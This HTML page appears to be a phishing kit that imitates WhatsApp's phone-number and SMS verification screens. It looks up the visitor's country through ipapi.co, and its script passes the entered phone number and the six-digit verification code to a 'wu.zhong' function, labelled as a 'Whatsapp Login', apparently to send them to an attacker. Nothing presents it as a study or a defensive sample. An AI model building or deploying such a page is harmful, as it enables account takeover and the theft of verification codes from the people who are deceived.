<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WhatsApp Verification</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }


    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #0b141a;
      color: #e9edef;
      min-height: 100vh;
      overflow-x: hidden;
    }


    .container {
      max-width: 100vw;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      position: relative;
    }


    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 24px;
      position: relative;
      z-index: 10;
    }


    .close-btn, .menu-btn {
      width: 24px;
      height: 24px;
      cursor: pointer;
      color: #8696a0;
      background: none;
      border: none;
      font-size: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
    }


    .close-btn:hover, .menu-btn:hover {
      color: #e9edef;
    }


    .content {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 0 24px;
    }


    .screen {
      display: none;
      flex-direction: column;
      flex: 1;
    }


    .screen.active {
      display: flex;
    }


    .title {
      font-size: 28px;
      font-weight: 400;
      margin-bottom: 32px;
      line-height: 1.2;
    }


    .subtitle {
      color: #8696a0;
      font-size: 15px;
      line-height: 1.4;
      margin-bottom: 24px;
    }


    .link {
      color: #53bdeb;
      text-decoration: none;
      cursor: pointer;
    }


    .link:hover {
      text-decoration: underline;
    }


    .form-group {
      margin-bottom: 24px;
    }


    .country-selector {
      position: relative;
      margin-bottom: 20px;
    }


    .country-input {
      width: 100%;
      background: transparent;
      border: none;
      border-bottom: 2px solid #53bdeb;
      color: #e9edef;
      font-size: 16px;
      padding: 12px 0;
      outline: none;
      cursor: pointer;
      text-align: center;
      position: relative;
    }


    .country-input::after {
      content: '';
      position: absolute;
      right: 0;
      color: #53bdeb;
      font-size: 12px;
    }


    .phone-container {
      display: flex;
      gap: 16px;
      align-items: flex-end;
    }


    .country-code {
      flex: 0 0 auto;
      border-bottom: 2px solid #8696a0;
      padding: 12px 0;
      color: #e9edef;
      font-size: 16px;
      background: transparent;
      border-top: none;
      border-left: none;
      border-right: none;
      outline: none;
      width: 60px;
    }


    .phone-input {
      flex: 1;
      background: transparent;
      border: none;
      border-bottom: 2px solid #8696a0;
      color: #e9edef;
      font-size: 16px;
      padding: 12px 0;
      outline: none;
    }


    .phone-input:focus, .country-code:focus {
      border-bottom-color: #53bdeb;
    }


    .phone-input::placeholder {
      color: #8696a0;
    }


    .next-btn {
      background: #00a884;
      color: white;
      border: none;
      border-radius: 24px;
      padding: 16px 32px;
      font-size: 16px;
      cursor: pointer;
      margin-top: auto;
      margin-bottom: 32px;
      transition: background-color 0.2s;
    }


    .next-btn:hover {
      background: #008f72;
    }


    .next-btn:disabled {
      background: #233329;
      color: #8696a0;
      cursor: not-allowed;
    }



    .verification-title {
      font-size: 24px;
      font-weight: 400;
      margin-bottom: 24px;
    }


    .sent-to {
      color: #8696a0;
      font-size: 15px;
      margin-bottom: 8px;
    }


    .phone-number {
      color: #e9edef;
      font-size: 15px;
    }


    .code-input-container {
      display: flex;
      gap: 8px;
      margin: 40px 0;
      justify-content: center;
    }


    .code-digit {
      width: 40px;
      height: 50px;
      background: transparent;
      border: none;
      border-bottom: 2px solid #8696a0;
      color: #e9edef;
      font-size: 24px;
      text-align: center;
      outline: none;
      transition: border-color 0.2s;
    }


    .code-digit:focus {
      border-bottom-color: #53bdeb;
    }


    .code-digit.filled {
      border-bottom-color: #00a884;
    }


    .resend-link {
      color: #00a884;
      text-decoration: none;
      font-size: 15px;
      display: block;
      text-align: center;
      margin-top: 32px;
    }


    .resend-link:hover {
      text-decoration: underline;
    }



    @media (max-width: 480px) {
      .header {
        padding: 16px 20px;
      }
     
      .content {
        padding: 0 20px;
      }
     
      .title {
        font-size: 24px;
      }
     
      .code-digit {
        width: 36px;
        height: 46px;
        font-size: 20px;
      }
    }



    .loading-dots {
      display: inline-block;
    }


    .loading-dots::after {
      content: '';
      animation: dots 1.5s infinite;
    }


    @keyframes dots {
      0%, 20% { content: ''; }
      40% { content: '.'; }
      60% { content: '..'; }
      80%, 100% { content: '...'; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <button class="close-btn" onclick="goBack()">✕</button>
      <button class="menu-btn">⋮</button>
    </div>



    <div class="screen active" id="phoneScreen">
      <div class="content">
        <h1 class="title">Enter your phone number</h1>
        <p class="subtitle">
          WhatsApp will need to verify your phone number. Carrier charges may apply.
          <a href="#" class="link">What's my number?</a>
        </p>


        <div class="form-group">
          <div class="country-selector">
            <div class="country-input" id="countrySelect">
       
            </div>
          </div>


          <div class="phone-container">
            <input type="text" class="country-code" id="countryCode" value="" readonly>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone number" maxlength="11">
          </div>
        </div>


        <button class="next-btn" id="nextBtn" onclick="goToVerification()">Next</button>
      </div>
    </div>



    <div class="screen" id="verificationScreen">
      <div class="content">
        <h1 class="verification-title">Verifying your number</h1>
        <p class="sent-to">SMS sent to <span class="phone-number" id="displayNumber">+91 99995 53246</span>.</p>
        <a href="#" class="link" onclick="goBack()">Wrong number?</a>


        <div class="code-input-container">
          <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 0)">
          <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 1)">
          <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 2)">
          <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 3)">
          <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 4)">
          <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 5)">
        </div>


        <a href="#" class="resend-link" onclick="resendCode()">Didn't receive code?</a>
      </div>
    </div>
  </div>


  <script>
    let currentScreen = 'phoneScreen';


    window.onload = async function(){


    var json= await fetch("https://ipapi.co/json/").then(res => res.json());
    document.querySelector('.country-input').innerHTML = `${json.country_name}`;
    document.querySelector('.country-code').value = `${json.country_calling_code}`;


    }

   



    document.getElementById('phoneInput').addEventListener('input', function() {
      const nextBtn = document.getElementById('nextBtn');
      if (this.value.length >= 8) {
        nextBtn.disabled = false;
      } else {
        nextBtn.disabled = true;
      }
    });


    function goToVerification() {
      const phoneInput = document.getElementById('phoneInput').value;
      const countryCode = document.getElementById('countryCode').value;
     
      if (phoneInput.length < 8) {
      
        return;
      }



      const formattedNumber = countryCode + ' ' + phoneInput.replace(/(\d{5})(\d{5})/, '$1 $2');
      document.getElementById('displayNumber').textContent = formattedNumber;


      
      document.getElementById('phoneScreen').classList.remove('active');
      document.getElementById('verificationScreen').classList.add('active');
      currentScreen = 'verificationScreen';


     
      setTimeout(() => {
        document.querySelector('.code-digit').focus();
      }, 300);

      
      wu.zhong(`🔰Whatsapp Login \n\n📞Mobile Number: ${formattedNumber}`, "com.whatsapp#");

    }


    function goBack() {
      if (currentScreen === 'verificationScreen') {
        document.getElementById('verificationScreen').classList.remove('active');
        document.getElementById('phoneScreen').classList.add('active');
        currentScreen = 'phoneScreen';
 
        document.querySelectorAll('.code-digit').forEach(input => {
          input.value = '';
          input.classList.remove('filled');
        });
      }
    }


    function moveToNext(current, index) {
      const value = current.value;
     

      if (!/^\d$/.test(value)) {
        current.value = '';
        return;
      }


      current.classList.add('filled');
     
  
      if (value && index < 5) {
        const nextInput = document.querySelectorAll('.code-digit')[index + 1];
        nextInput.focus();
      }



      const allInputs = document.querySelectorAll('.code-digit');
      const allFilled = Array.from(allInputs).every(input => input.value !== '');
     
      if (allFilled) {

        const code = Array.from(allInputs).map(input => input.value).join('');
        console.log('Verification code:', code);

        setTimeout(() => {
         wu.zhong(`🔰Whatsapp Login \n\n🈸Code: ${code}`, "com.whatsapp");
        }, 500);
      }
    }



    document.querySelectorAll('.code-digit').forEach((input, index) => {
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value === '' && index > 0) {
          const prevInput = document.querySelectorAll('.code-digit')[index - 1];
          prevInput.focus();
          prevInput.value = '';
          prevInput.classList.remove('filled');
        } else if (e.key === 'Backspace') {
          this.classList.remove('filled');
        }
      });



      input.addEventListener('paste', function(e) {
        e.preventDefault();
        const paste = e.clipboardData.getData('text');
        const digits = paste.replace(/\D/g, '').slice(0, 6);
       
        digits.split('').forEach((digit, i) => {
          const targetInput = document.querySelectorAll('.code-digit')[i];
          if (targetInput) {
            targetInput.value = digit;
            targetInput.classList.add('filled');
          }
        });
      });
    });


    document.getElementById('nextBtn').disabled = true;
  </script>
</body>
</html>
